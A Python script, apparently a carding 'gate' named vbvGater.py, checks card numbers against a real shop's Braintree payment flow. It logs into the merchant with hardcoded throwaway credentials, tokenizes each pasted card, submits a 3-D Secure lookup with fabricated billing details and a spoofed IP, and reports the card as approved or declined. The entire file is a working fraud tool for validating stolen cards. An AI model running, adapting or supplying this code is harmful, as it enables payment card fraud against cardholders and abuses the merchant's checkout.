# vbvGater.py

import base64
import uuid
from requests import Session

def CutQuery(text, Luno, Ldos):
    return (text.split(Luno))[1].split(Ldos)[0]

def VBV3D(cards):
    try:
        session = Session()
        ccs = cards.split('|')

        headers1 = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
        }
        r1 = session.get('https://www.luminati.co.uk/my-account/payment-methods/', headers=headers1)
        login_nonce = CutQuery(r1.text, ' name="woocommerce-login-nonce" value="', '"')

        headers2 = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.luminati.co.uk',
            'referer': 'https://www.luminati.co.uk/my-account/payment-methods/',
            'user-agent': headers1['user-agent']
        }
        data = {
            'username': 'sohayeg260@movfull.com',
            'password': 'yEDH27BG4f6Ad4a',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/payment-methods/',
            'login': 'Log in'
        }
        session.post('https://www.luminati.co.uk/my-account/payment-methods/', headers=headers2, data=data)

        r2 = session.get('https://www.luminati.co.uk/my-account/add-payment-method/', headers=headers1)
        nonce_add_payment = CutQuery(r2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        token_bear = CutQuery(r2.text, 'wc_braintree_client_token = ["', '"]')

        token_bear_final = base64.b64decode(token_bear).decode('utf-8')
        authorizationFingerprint = CutQuery(token_bear_final, 'authorizationFingerprint":"', '"')

        headers3 = {
            'authorization': f'Bearer {authorizationFingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': headers1['user-agent']
        }

        sessionId = str(uuid.uuid4())
        json_data_tokenize = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': sessionId,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': ccs[0],
                        'expirationMonth': ccs[1],
                        'expirationYear': ccs[2],
                        'cvv': ccs[3],
                        'billingAddress': {
                            'postalCode': '10010',
                            'streetAddress': 'E Little York Rd 7912',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        r3 = session.post('https://payments.braintree-api.com/graphql', headers=headers3, json=json_data_tokenize)
        token_card = r3.json()['data']['tokenizeCreditCard']['token']

        headers4 = {
            'content-type': 'application/json',
            'origin': 'https://www.luminati.co.uk',
            'user-agent': headers1['user-agent']
        }

        json_data_lookup = {
            'amount': '0.00',
            'browserColorDepth': 24,
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': 'es-ES',
            'browserScreenHeight': 1080,
            'browserScreenWidth': 1920,
            'browserTimeZone': 300,
            'deviceChannel': 'Browser',
            'additionalInfo': {
                'ipAddress': '190.121.131.76',
                'billingLine1': 'E Little York Rd 7912',
                'billingLine2': '',
                'billingCity': 'Norman',
                'billingState': 'CA',
                'billingPostalCode': '10010',
                'billingCountryCode': 'US',
                'billingPhoneNumber': '8194544131',
                'billingGivenName': 'Lucas',
                'billingSurname': 'Lorenzo',
                'email': 'sohayeg260@movfull.com',
            },
            'challengeRequested': True,
            'bin': ccs[0][0:6],
            'dfReferenceId': str(uuid.uuid4()),
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.106.0',
                'cardinalDeviceDataCollectionTimeElapsed': 2760,
                'issuerDeviceDataCollectionTimeElapsed': 3755,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': authorizationFingerprint,
            'braintreeLibraryVersion': 'braintree/web/3.106.0',
            '_meta': {
                'merchantAppId': 'www.luminati.co.uk',
                'platform': 'web',
                'sdkVersion': '3.106.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': sessionId,
            },
        }

        lookup_url = f'https://api.braintreegateway.com/merchants/vsp2vyhg3cjfwt7w/client_api/v1/payment_methods/{token_card}/three_d_secure/lookup'
        r4 = session.post(lookup_url, headers=headers4, json=json_data_lookup)
        rjson = r4.json()

        status = rjson['paymentMethod']['threeDSecureInfo']['status']
        enrolled = rjson['paymentMethod']['threeDSecureInfo']['enrolled']

        if 'authenticate_successful' in status or 'authenticate_attempt_successful' in status:
            return 'Approved! ✅', f'{status} | {enrolled}'
        else:
            return 'Declined! ❌', f'{status} | {enrolled}'

    except Exception as e:
        return 'Declined! ❌', f'Error: {str(e)}'

if __name__ == '__main__':
    ccs = input('ccs: ')
    result = VBV3D(ccs)
    print(result)

